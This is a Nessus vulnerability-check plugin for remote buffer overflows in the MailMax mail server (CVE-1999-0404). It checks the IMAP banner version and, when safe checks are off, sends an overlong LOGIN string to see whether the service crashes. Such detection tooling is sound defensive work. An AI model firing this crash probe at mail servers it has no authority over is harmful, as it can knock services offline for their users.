#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11598);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-1999-0404");
 script_bugtraq_id(2312, 7326);
 script_xref(name:"OSVDB", value:"1749");
 script_xref(name:"OSVDB", value:"12048");
 
 script_name(english:"MailMax < 5.0.10.8 Multiple Remote Overflows");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP and IMAP servers are prone to buffer overflow attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of the MailMax mail server that
is vulnerable to various overflows.  These issues may allow an
unauthenticated remote attacker to disable the affected service and
possibly to execute arbitrary commands on the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/1999_1/0699.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2003-04/0169.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MailMax 5.0.10.8 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
 script_summary(english:"Overflows the remote IMAP server");
 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/imap", 143);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("imap_func.inc");

port = get_kb_item("Services/imap");
if(!port)port = 143;
if (!get_port_state(port)) exit(0);

banner = get_imap_banner(port:port);
if (!banner || "MailMax " >!< banner) exit(0);


if(safe_checks())
{
  if(egrep(pattern:"MailMax [1-5][^0-9]", string:banner))
  {
    report = string(
      "\n",
      "Nessus has determined the flaw exists with the application\n",
      "simply by looking at the version in the IMAP server's banner.\n"
    );
    security_hole(port:port, extra:report);
  }
  exit(0);
}

if (report_paranoia < 2) exit(0);

soc = open_sock_tcp(port);
if(soc)
{
  r = recv_line(socket:soc, length:4096);
  if ( ! r ) exit(0);
   send(socket:soc, data:string("0000 CAPABILITY\r\n"));
   r = recv_line(socket:soc, length:4096);
   r = recv_line(socket:soc, length:4096);
   send(socket:soc, data:'0001 LOGIN "nobody@example.com" "'+crap(50)+'\r\n');

   r = recv_line(socket:soc, length:4096);
   r = recv_line(socket:soc, length:4096);
   close(soc);

   soc = open_sock_tcp(port);
   if(!soc){security_hole(port); exit(0);}
   r = recv_line(socket:soc, length:4096);
   if(!r)security_hole(port);
   close(soc);  
}
